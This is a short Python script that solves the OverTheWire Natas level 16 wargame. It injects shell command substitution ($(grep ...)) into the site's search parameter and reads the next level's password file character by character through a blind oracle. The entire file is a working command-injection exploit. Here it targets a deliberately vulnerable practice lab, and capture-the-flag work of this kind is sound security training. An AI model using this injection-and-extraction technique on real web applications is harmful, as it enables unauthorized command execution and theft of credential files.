#!/usr/bin/env python3
import requests


url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
auth = ('natas16', natas16_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        search = f'$(grep {char} /etc/natas_webpass/natas17)'
        r = requests.get(url.format(search), auth=auth)
        if 'password' not in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            search = f'$(grep ^{password+char} /etc/natas_webpass/natas17)'
            r = requests.get(url.format(search), auth=auth)
            if 'password' not in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
